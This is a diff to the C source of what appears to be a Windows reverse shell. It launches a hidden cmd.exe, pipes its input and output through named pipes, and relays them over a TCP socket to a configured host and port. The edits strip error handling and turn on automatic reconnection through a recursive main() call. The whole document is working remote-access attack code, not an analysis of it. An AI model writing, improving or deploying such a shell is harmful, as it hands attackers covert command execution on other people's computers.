@@ -1,6 +1,5 @@
 #define WIN32_LEAN_AND_MEAN
 #define _WIN32_WINNT 0x0501
-#define BUFSIZE 4096
 #define DEFAULT_BUFLEN 512
 #define DEFAULT_PORT "8888"
 #define DEFAULT_IP "127.0.0.1"
@@ -14,7 +13,7 @@
 #include <stdio.h>
 #include <tchar.h>
 #include <psapi.h>
-#include <assert.h>                                                                                                                                                                                                                                                                                                                                                                                
+#include <assert.h>
 
 #pragma comment(lib, "Ws2_32.lib")
 #pragma comment(lib, "Mswsock.lib")
@@ -30,27 +29,20 @@ Pipe pipe;
 char OUTPUT_text[4096];
 DWORD OUTPUT_size;
 
-char *werr()
+void logprint(char *type, char *message)
 {
-    static char szBuf[80];
-    LPVOID lpMsgBuf;
-    DWORD dw = GetLastError();
-
-    FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER |
-                      FORMAT_MESSAGE_FROM_SYSTEM,
-                  NULL,
-                  dw,
-                  MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
-                  (LPTSTR)&lpMsgBuf, 0, NULL);
-
-    sprintf(szBuf, "error %d: %s", dw, lpMsgBuf);
-
-    return szBuf;
+    if (strcmp(type, "ERROR") == 0)
+    {
+        printf("[-]%s\n", message);
+    }
+    else if (strcmp(type, "SUCCESS") == 0)
+    {
+        printf("[+]%s\n", message);
+    }
 }
 
 static Pipe create_pipes()
 {
-    DWORD dwError;
     TCHAR PipeNameBuffer[MAX_PATH];
     long i;
     PTSTR IO = _T("IO");
@@ -60,39 +52,22 @@ static Pipe create_pipes()
     SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), 0, 1};
 
     for (i = 0; i < 4; i++)
+    {
         pipe->hs[i] = pipe->procH = INVALID_HANDLE_VALUE;
+    }
     pipe->bufsize = 0;
     for (i = 0; i < 2; i++)
     {
-        sprintf(PipeNameBuffer,
-                  _T("\\\\.\\pipe\\%c%08x"), IO[i], GetCurrentProcessId());
-
-        pipe->hs[i * 2] = CreateNamedPipe(PipeNameBuffer,
-                                          open_modes[i] |
-                                              FILE_FLAG_OVERLAPPED,
-                                          PIPE_TYPE_BYTE | PIPE_WAIT, 1,
-                                          nSize, nSize, 120 * 1000, 0);
-
-        SetHandleInformation(pipe->hs[i * 2], HANDLE_FLAG_INHERIT,
-                             HANDLE_FLAG_INHERIT);
-        if (pipe->hs[i * 2] == INVALID_HANDLE_VALUE)
-            return FALSE;
-        pipe->hs[i * 2 + 1] = CreateFile(PipeNameBuffer,
-                                         access[i],
-                                         0,
-                                         0,
-                                         OPEN_EXISTING,
-                                         FILE_FLAG_OVERLAPPED, NULL);
-        if (pipe->hs[i * 2 + 1] == INVALID_HANDLE_VALUE)
-        {
-            dwError = GetLastError();
-            CloseHandle(pipe->hs[i * 2]);
-            SetLastError(dwError);
-            return FALSE;
-        }
+        sprintf(PipeNameBuffer, _T("\\\\.\\pipe\\%c%08x"), IO[i], GetCurrentProcessId());
+        pipe->hs[i * 2] = CreateNamedPipe(PipeNameBuffer, open_modes[i] | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 1, nSize, nSize, 120 * 1000, 0);
+        SetHandleInformation(pipe->hs[i * 2], HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
+        pipe->hs[i * 2 + 1] = CreateFile(PipeNameBuffer, access[i], 0, 0, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
     }
     for (i = 0; i < 2; i++)
+    {
         pipe->evs[i] = CreateEvent(0, 1, 1, 0);
+    }
+
     return (pipe);
 }
 
@@ -105,10 +80,10 @@ static const PTSTR pipe_init()
     PTSTR cmd = strdup(_T("c:\\Windows\\system32\\cmd.exe"));
     const int sz = 999;
     PTSTR s = snewn(sz, TCHAR), buf = snewn(sz, TCHAR);
-
     pipe = snewn(1, struct Pipe0);
-    if (!create_pipes())
-        return _T("Unable to create pipes for pipe command");
+
+    create_pipes();
+
     sa.nLength = sizeof(sa);
     sa.lpSecurityDescriptor = NULL;
     sa.bInheritHandle = TRUE;
@@ -122,41 +97,10 @@ static const PTSTR pipe_init()
     si.hStdInput = pipe->hs[0];
     si.hStdOutput = pipe->hs[2];
     si.hStdError = pipe->hs[2];
-    if (si.hStdError == INVALID_HANDLE_VALUE)
-    {
-        DWORD e = GetLastError();
-        return sprintf(s, _T("no nul filename: %s\n"), strerror(e)), s;
-    }
-    {
-        DWORD dw, ew, n, i = 0;
-        if (!CreateProcess(NULL, cmd, &sa, NULL, TRUE,
-                           CREATE_NO_WINDOW | NORMAL_PRIORITY_CLASS,
-                           NULL, NULL, &si, &pi))
-            return sprintf(s, _T("process %s won't start: %s"), cmd,
-                             werr()),
-                   s;
+    DWORD dw, ew, n, i = 0;
 
-        if ((dw = GetExitCodeProcess(pi.hProcess, &ew)) && ew != STILL_ACTIVE)
-            return sprintf(s,
-                             _T
-			     ("process %s terminated early\n%d\n\n: %d : %s"),
-                             cmd, ew, dw, werr()),
-                   s;
+    CreateProcess(NULL, cmd, &sa, NULL, TRUE, CREATE_NO_WINDOW | NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
 
-        for (i = 0, n = 99; !n && i < 1; i++)
-        {
-            n = GetModuleBaseName(pi.hProcess, 0, s, sz);
-            if (!n)
-            {
-                DWORD e = GetLastError();
-                printf("process won't give up it's exe filename: %s\n%d\nh=0x%llx\n",
-                       werr(), e, pi.hProcess);
-            }
-            Sleep(1000);
-        }
-        if (!n)
-            exit(1);
-    }
     return NULL;
 }
 
@@ -164,7 +108,9 @@ int exitwithchild()
 {
     DWORD dw, ew;
     if ((dw = GetExitCodeProcess(pi.hProcess, &ew)) && ew != STILL_ACTIVE)
+    {
         exit(ew);
+    }
     return 0;
 }
 
@@ -173,13 +119,16 @@ int frompipe(HANDLE in, HANDLE ou)
     static HANDLE revent = 0;
     OVERLAPPED ol = {0};
     if (!revent)
+    {
         revent = CreateEvent(0, 0, 0, 0);
+    }
     ol.hEvent = revent;
     DWORD dw, r, rf, q;
     char b[4096];
     DWORD read = 0;
-    for (;; Sleep(300))
+    for (;;)
     {
+        Sleep(300);
         if (rf = ReadFile(in, b, sizeof(b), &r, &ol))
         {
             OUTPUT_size = r;
@@ -192,7 +141,8 @@ int frompipe(HANDLE in, HANDLE ou)
     }
 }
 
-int init_socket( LPVOID lpParam){
+int init_socket(LPVOID lpParam)
+{
     WSADATA wsaData;
     SOCKET ConnectSocket = INVALID_SOCKET;
     struct addrinfo *result = NULL,
@@ -216,7 +166,7 @@ int init_socket( LPVOID lpParam){
         {
             closesocket(ConnectSocket);
             ConnectSocket = INVALID_SOCKET;
-            //main();
+            main();
         }
         break;
     }
@@ -237,7 +187,9 @@ int init_socket( LPVOID lpParam){
         {
             frompipe(pipe->hs[3], NULL);
             if (OUTPUT_size > 0)
+            {
                 send(ConnectSocket, OUTPUT_text, 4096, 0);
+            }
             memset(OUTPUT_text, 0, 4096);
             sended = 1;
         }
@@ -252,7 +204,6 @@ int init_socket( LPVOID lpParam){
                 {
                     CloseHandle(pipe->hs[h]);
                 }
-                //main();
             }
             if (iResult)
             {
@@ -269,9 +220,10 @@ int init_socket( LPVOID lpParam){
 
 int main()
 {
-    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) init_socket, NULL, 0, NULL);
+    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)init_socket, NULL, 0, NULL);
     int a = 0;
-    for(;;){
+    for (;;)
+    {
         scanf("%d", &a);
     }
     return 0;
